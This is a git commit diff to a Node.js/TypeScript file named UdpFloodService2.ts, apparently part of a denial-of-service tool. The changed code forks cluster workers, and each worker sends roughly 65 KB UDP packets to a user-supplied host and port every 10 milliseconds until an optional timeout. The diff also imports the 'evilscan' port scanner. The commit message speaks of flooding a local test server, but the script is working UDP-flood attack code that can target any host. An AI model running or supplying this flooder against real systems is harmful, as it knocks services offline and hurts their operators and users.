ea7620b7e8f0a4b6be4547e89f2997e0454a3db1
Sloppy Lopez <sloppy@sloppylopez.com>
2019-02-27 16:41:22 +0100

    Added local express server to be flooded, workers using all available ports of the system, added interval to avoid buff overflow

--- services/UdpFloodService2.ts
+++ services/UdpFloodService2.ts
@@ -1,10 +1,11 @@
 const cluster = require('cluster');
-var evilscan = require('evilscan');
+let evilscan = require('evilscan');
+let dgram = require('dgram');
 let program = require('commander');
 const Confirm = require('prompt-confirm');
 const http = require('http');
 const numCPUs = require('os').cpus().length;
-var options = {
+const options = {
     target: '127.0.0.1',
     port: '21-23',
     status: 'TROU',
@@ -19,11 +20,18 @@ let programHelp = program
 
 programHelp.parse(process.argv);
 
+let tcpPortUsed = require('tcp-port-used');
+
+tcpPortUsed.check(3000, '127.0.0.1')
+    .then(function (inUse) {
+        console.log('Port 3000 usage: ' + inUse + ' pid: ' + process.pid);
+    }, function (err) {
+        console.error('Error on check:', err.message);
+    });
+
 function udpFlood(host, port, timeout, pid) {
 
     let HOST = host;
-    let dgram = require('dgram');
-    let client = dgram.createSocket('udp4');
 
     let output = "";
     for (let i = 65500; i >= 0; i--) {
@@ -34,30 +42,30 @@ function udpFlood(host, port, timeout, pid) {
     // portScanner.findAPortNotInUse([3000, 3001, 3002, 3003, 3004, 3005, 3006, 3007, 3008, 3009], '127.0.0.1', function(error, port) {
     //     console.log('PORT IN USE AT: ' + port)
     // })
-    const N = 65535;
-    const numberArray = Array.apply(null, {length: N}).map(Number.call, Number);
+    // const N = 65535;
+    // const numberArray = Array.apply(null, {length: N}).map(Number.call, Number);
     // portScanner.findAPortInUse([3001, 3002, 3003, 3004, 3005, 3006, 3007, 3008, 3009]).then(function (port, error) {// ports 0 to 1023 are reserved
-    // console.log('PORT IN USE AT: ' + port);
-    // if (error) {return error}
-    while (1) {
-        // const randomPort = Math.floor(Math.random() * (65535) + 1);
-        // const PORT = port || randomPort;
+    const intervalObj = setInterval(() => {
         if (timeout) {
             let nowTime = new Date();
             if (nowTime.getTime() >= (startTime.getTime() + timeout)) {
-                break;
+                console.log('Timeout Reached for pid: ' + pid);
+                clearInterval(intervalObj);
             }
         }
-
+        // const randomPort = Math.floor(Math.random() * (65535) + 1);
+        let socket = dgram.createSocket('udp4');
         let message = Buffer.from(output);
 
-        // console.log('PORT IN USE AT: ' + port);
-        client.send(message, 0, message.length, port, HOST, function (err, bytes) {
+        socket.send(message, 0, message.length, port, HOST, function (err, bytes) {
             if (err) throw err;
-            console.log('UDP message sent to ' + HOST + ':' + port + ' pid: ' + pid);
+            console.log('pid: ' + pid + ' sent package UDP with ' + bytes + ' bytes message to ' + HOST + ':' + port + ' from ' + socket.address().address + ':' + socket.address().port);
         });
-    }
-    // })
+
+        socket.on('message', (msg, rinfo) => {
+            console.log(`server got: ${msg} from ${rinfo.address}:${rinfo.port}`);
+        });
+    }, 10)
 }
 
 function start(host: any, port: any, timeout: any) {
@@ -65,7 +73,7 @@ function start(host: any, port: any, timeout: any) {
         console.log(`Master ${process.pid} is running`);
 
         // Fork workers.
-        for (let i = 0; i < numCPUs; i++) {
+        for (let i = 0; i < (numCPUs / 4); i++) {
             cluster.fork();
         }
 
@@ -81,44 +89,44 @@ function start(host: any, port: any, timeout: any) {
         //     res.end('hello world\n');
         // }).listen(8000);
 
-        // var scanner = new evilscan(options);
-        // scanner.on('result', function (data) {
-        //     // fired when item is matching options
-        //     console.log(data);
-        // });
-        // scanner.on('error', function (err, data) {
-        //     throw new Error(data.toString());
-        // });
-        // scanner.on('done', function () {
-        //     // finished !
-        //     console.log('Evil Activities finished')
-        // });
-        // scanner.run();
-
         console.log(`Worker ${process.pid} started`);
         udpFlood(host, port, timeout, process.pid);
     }
 }
 
 if (program.host) {
+    let question = new Confirm('CAUTION: You are running flood without any timeout to stop, you can define a timeout with --timeout. Continue? [Y/N] ');
 
     if (!program.timeout) {
-        new Confirm('CAUTION: You are running flood without any timeout to stop, you can define a timeout with --timeout. Continue? [Y/N] ')
-            .ask(function (answer) {
-                console.log(answer);
-                if (!answer) {
-                    console.log('Ok, run program again with --timeout parameter.');
-                    process.stdin.destroy();
-                } else {
-                    // udpFlood(program.host, program.port, null);
-                    start(program.host, program.port, null)
-                }
-            });
+        question.ask(function (answer) {
+            console.log(answer);
+            if (!answer) {
+                console.log('Ok, run program again with --timeout parameter.');
+                process.stdin.destroy();
+            } else {
+                start(program.host, program.port, null)
+            }
+        });
     } else {
-        // udpFlood(program.host, program.port, program.timeout);
         start(program.host, program.port, program.timeout);
     }
 
 } else {
     programHelp.help();
 }
+
+// if (process.platform === "win32") {
+//     var rl = require("readline").createInterface({
+//         input: process.stdin,
+//         output: process.stdout
+//     });
+//
+//     rl.on("SIGINT", function () {
+//         process.emit("SIGINT");
+//     });
+// }
+//
+// process.on("SIGINT", function () {
+//     //graceful shutdown
+//     process.exit();
+// });
